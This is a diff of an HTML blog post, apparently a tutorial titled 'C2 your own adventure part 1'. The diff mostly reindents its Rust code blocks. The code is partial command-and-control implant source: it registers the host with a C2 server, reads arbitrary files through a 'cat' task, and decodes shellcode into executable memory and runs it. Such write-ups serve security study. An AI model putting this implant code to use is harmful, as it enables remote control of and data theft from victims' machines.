@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-12-09 Fri 14:00 -->
+<!-- 2025-01-21 Tue 19:16 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>C2 your own adventure part 1</title>
@@ -242,20 +242,20 @@ The code written for this component is fairly simple, and is based on the exampl
     <span class="org-keyword">let</span> <span class="org-variable-name">uri</span> = build_c2uri(<span class="org-string">"/reg"</span>);
 
     <span class="org-keyword">let</span> <span class="org-variable-name">req</span> = <span class="org-type">Request</span>::builder()
-	.method(<span class="org-type">Method</span>::<span class="org-type">POST</span>)
-	.uri(uri)
-	.header(<span class="org-string">"Content-Type"</span>, <span class="org-string">"application/x-www-form-urlencoded"</span>)
-	.body(<span class="org-type">Body</span>::from(<span class="org-rust-builtin-formatting-macro">format!</span>(
-	    <span class="org-string">"id=</span><span class="org-rust-string-interpolation">{}</span><span class="org-string">&amp;os=</span><span class="org-rust-string-interpolation">{}</span><span class="org-string">&amp;arch=</span><span class="org-rust-string-interpolation">{}</span><span class="org-string">"</span>,
-	    imp_inf.id, imp_inf.host_inf.os, imp_inf.host_inf.arch
-	)))
-	.expect(<span class="org-string">"request builder"</span>);
+        .method(<span class="org-type">Method</span>::<span class="org-type">POST</span>)
+        .uri(uri)
+        .header(<span class="org-string">"Content-Type"</span>, <span class="org-string">"application/x-www-form-urlencoded"</span>)
+        .body(<span class="org-type">Body</span>::from(<span class="org-rust-builtin-formatting-macro">format!</span>(
+            <span class="org-string">"id=</span><span class="org-rust-string-interpolation">{}</span><span class="org-string">&amp;os=</span><span class="org-rust-string-interpolation">{}</span><span class="org-string">&amp;arch=</span><span class="org-rust-string-interpolation">{}</span><span class="org-string">"</span>,
+            imp_inf.id, imp_inf.host_inf.os, imp_inf.host_inf.arch
+        )))
+        .expect(<span class="org-string">"request builder"</span>);
 
     <span class="org-keyword">let</span> <span class="org-variable-name">resp</span> = client.request(req).<span class="org-keyword">await</span>;
 
     <span class="org-keyword">match</span> resp {
-	<span class="org-type">Err</span>(_e) =&gt; <span class="org-keyword">return</span> <span class="org-type">Err</span>(<span class="org-type">ImplantError</span>::<span class="org-type">ServerUnreachable</span>),
-	<span class="org-type">Ok</span>(_) =&gt; <span class="org-type">Ok</span>(()),
+        <span class="org-type">Err</span>(_e) =&gt; <span class="org-keyword">return</span> <span class="org-type">Err</span>(<span class="org-type">ImplantError</span>::<span class="org-type">ServerUnreachable</span>),
+        <span class="org-type">Ok</span>(_) =&gt; <span class="org-type">Ok</span>(()),
     }
 }
 </pre>
@@ -296,9 +296,9 @@ This enum is the used with the pattern matching functionality in rust to execute
     <span class="org-variable-name">task</span>: <span class="org-rust-ampersand">&amp;</span><span class="org-keyword">mut</span> <span class="org-type">ImplatTask</span>,
 ) -&gt; <span class="org-type">Result</span>&lt;<span class="org-type">ImplantTaskResult</span>, <span class="org-type">ImplantError</span>&gt; {
     <span class="org-keyword">match</span> task.task_type {
-	<span class="org-type">ImplantTaskType</span>::<span class="org-type">Builtin</span> =&gt; builtin_tasks(task),
-	<span class="org-type">ImplantTaskType</span>::<span class="org-type">Module</span> =&gt; module_task(task),
-	<span class="org-type">ImplantTaskType</span>::<span class="org-type">None</span> =&gt; <span class="org-type">Err</span>(<span class="org-type">ImplantError</span>::<span class="org-type">TaskError</span>),
+        <span class="org-type">ImplantTaskType</span>::<span class="org-type">Builtin</span> =&gt; builtin_tasks(task),
+        <span class="org-type">ImplantTaskType</span>::<span class="org-type">Module</span> =&gt; module_task(task),
+        <span class="org-type">ImplantTaskType</span>::<span class="org-type">None</span> =&gt; <span class="org-type">Err</span>(<span class="org-type">ImplantError</span>::<span class="org-type">TaskError</span>),
     }
 }
 </pre>
@@ -329,28 +329,28 @@ So let's take a closer look at the implementation of <code>cat</code><br>
 ) -&gt; <span class="org-type">Result</span>&lt;<span class="org-type">ImplantTaskResult</span>, <span class="org-type">ImplantError</span>&gt; {
     <span class="org-keyword">let</span> <span class="org-keyword">mut</span> <span class="org-variable-name">result</span> = <span class="org-type">ImplantTaskResult</span>::new();
     <span class="org-keyword">match</span> task.name.as_str() {
-	<span class="org-string">"ls"</span> =&gt; {...}
-	<span class="org-string">"cd"</span> =&gt; {...}
-	<span class="org-string">"cat"</span> =&gt; {
-	    <span class="org-keyword">for</span> <span class="org-variable-name">arg</span> <span class="org-keyword">in</span> <span class="org-rust-ampersand">&amp;</span>task.args {
-		<span class="org-keyword">let</span> <span class="org-variable-name">path</span> = <span class="org-type">Path</span>::new(arg);
-		result.push_str(
-		    <span class="org-rust-builtin-formatting-macro">format!</span>(<span class="org-string">"TARGET: </span><span class="org-rust-string-interpolation">{}</span><span class="org-string">:\n"</span>, path.display()).as_str(),
-		);
-		<span class="org-keyword">if</span> !path.exists() {
-		    result.push_str(<span class="org-string">"File does not exist\n"</span>);
-		} <span class="org-keyword">else</span> <span class="org-keyword">if</span> path.is_dir() {
-		    result.push_str(<span class="org-string">"Can't read dir\n"</span>);
-		} <span class="org-keyword">else</span> <span class="org-keyword">if</span> path.is_file() {
-		    <span class="org-keyword">let</span> <span class="org-keyword">mut</span> <span class="org-variable-name">file</span> = <span class="org-type">File</span>::open(path).unwrap();
-		    file.read_to_string(<span class="org-rust-ampersand">&amp;</span><span class="org-keyword">mut</span> result);
-		}
-		result.push_str(<span class="org-string">"======================\n"</span>)
-	    }
-	}
-	<span class="org-string">"pwd"</span> =&gt; {...}
-	<span class="org-string">"whoami"</span> =&gt; {...}
-	_ =&gt; {<span class="org-keyword">return</span> <span class="org-type">Err</span>(<span class="org-type">ImplantError</span>::<span class="org-type">TaskError</span>)}
+        <span class="org-string">"ls"</span> =&gt; {...}
+        <span class="org-string">"cd"</span> =&gt; {...}
+        <span class="org-string">"cat"</span> =&gt; {
+            <span class="org-keyword">for</span> <span class="org-variable-name">arg</span> <span class="org-keyword">in</span> <span class="org-rust-ampersand">&amp;</span>task.args {
+                <span class="org-keyword">let</span> <span class="org-variable-name">path</span> = <span class="org-type">Path</span>::new(arg);
+                result.push_str(
+                    <span class="org-rust-builtin-formatting-macro">format!</span>(<span class="org-string">"TARGET: </span><span class="org-rust-string-interpolation">{}</span><span class="org-string">:\n"</span>, path.display()).as_str(),
+                );
+                <span class="org-keyword">if</span> !path.exists() {
+                    result.push_str(<span class="org-string">"File does not exist\n"</span>);
+                } <span class="org-keyword">else</span> <span class="org-keyword">if</span> path.is_dir() {
+                    result.push_str(<span class="org-string">"Can't read dir\n"</span>);
+                } <span class="org-keyword">else</span> <span class="org-keyword">if</span> path.is_file() {
+                    <span class="org-keyword">let</span> <span class="org-keyword">mut</span> <span class="org-variable-name">file</span> = <span class="org-type">File</span>::open(path).unwrap();
+                    file.read_to_string(<span class="org-rust-ampersand">&amp;</span><span class="org-keyword">mut</span> result);
+                }
+                result.push_str(<span class="org-string">"======================\n"</span>)
+            }
+        }
+        <span class="org-string">"pwd"</span> =&gt; {...}
+        <span class="org-string">"whoami"</span> =&gt; {...}
+        _ =&gt; {<span class="org-keyword">return</span> <span class="org-type">Err</span>(<span class="org-type">ImplantError</span>::<span class="org-type">TaskError</span>)}
     }
     task.run = <span class="org-keyword">true</span>;
     <span class="org-type">Ok</span>(result)
@@ -385,7 +385,7 @@ My result is based on an article from kerkour, which you can read here: <a href=
 I have outlined the steps needed to be done in the figure below:<br>
 </p>
 
-<figure id="orgdf8752b">
+<figure id="org140ba32">
 <img src="assets/2022-07-09_18-16-42_screenshot.png" alt="2022-07-09_18-16-42_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 1: </span>Modular task flow</figcaption>
@@ -406,17 +406,17 @@ In the unsafe block, the bytes are copied into the executable memory before the 
 ) -&gt; <span class="org-type">Result</span>&lt;<span class="org-type">ImplantTaskResult</span>, <span class="org-type">ImplantError</span>&gt; {
     <span class="org-keyword">let</span> <span class="org-variable-name">result</span>: <span class="org-type">String</span>;
     <span class="org-keyword">if</span> task.args.len() == 1 {
-	<span class="org-keyword">let</span> <span class="org-variable-name">bytes</span> = <span class="org-constant">base64</span>::decode(task.args[0].as_str()).unwrap();
-	<span class="org-keyword">let</span> <span class="org-variable-name">map</span> = <span class="org-type">MemoryMap</span>::new(
-	    bytes.len(),
-	    <span class="org-rust-ampersand">&amp;</span>[<span class="org-type">MapExecutable</span>, <span class="org-type">MapReadable</span>, <span class="org-type">MapWritable</span>],
-	).unwrap();
-	<span class="org-rust-unsafe">unsafe</span>{
-	    <span class="org-constant">std</span>::<span class="org-constant">ptr</span>::copy(bytes.as_ptr(), map.data(), bytes.len());
-	    <span class="org-keyword">let</span> <span class="org-variable-name">exec_shellcode</span>: <span class="org-keyword">extern</span> <span class="org-string">"C"</span> <span class="org-keyword">fn</span>() -&gt; <span class="org-rust-ampersand">&amp;</span><span class="org-type">str</span> = <span class="org-constant">mem</span>::transmute(map.data());
-	    <span class="org-keyword">let</span> <span class="org-variable-name">res</span> = exec_shellcode();
-	    result = <span class="org-type">String</span>::from(res);
-	}
+        <span class="org-keyword">let</span> <span class="org-variable-name">bytes</span> = <span class="org-constant">base64</span>::decode(task.args[0].as_str()).unwrap();
+        <span class="org-keyword">let</span> <span class="org-variable-name">map</span> = <span class="org-type">MemoryMap</span>::new(
+            bytes.len(),
+            <span class="org-rust-ampersand">&amp;</span>[<span class="org-type">MapExecutable</span>, <span class="org-type">MapReadable</span>, <span class="org-type">MapWritable</span>],
+        ).unwrap();
+        <span class="org-rust-unsafe">unsafe</span>{
+            <span class="org-constant">std</span>::<span class="org-constant">ptr</span>::copy(bytes.as_ptr(), map.data(), bytes.len());
+            <span class="org-keyword">let</span> <span class="org-variable-name">exec_shellcode</span>: <span class="org-keyword">extern</span> <span class="org-string">"C"</span> <span class="org-keyword">fn</span>() -&gt; <span class="org-rust-ampersand">&amp;</span><span class="org-type">str</span> = <span class="org-constant">mem</span>::transmute(map.data());
+            <span class="org-keyword">let</span> <span class="org-variable-name">res</span> = exec_shellcode();
+            result = <span class="org-type">String</span>::from(res);
+        }
     }
     <span class="org-type">Ok</span>(result)
 }
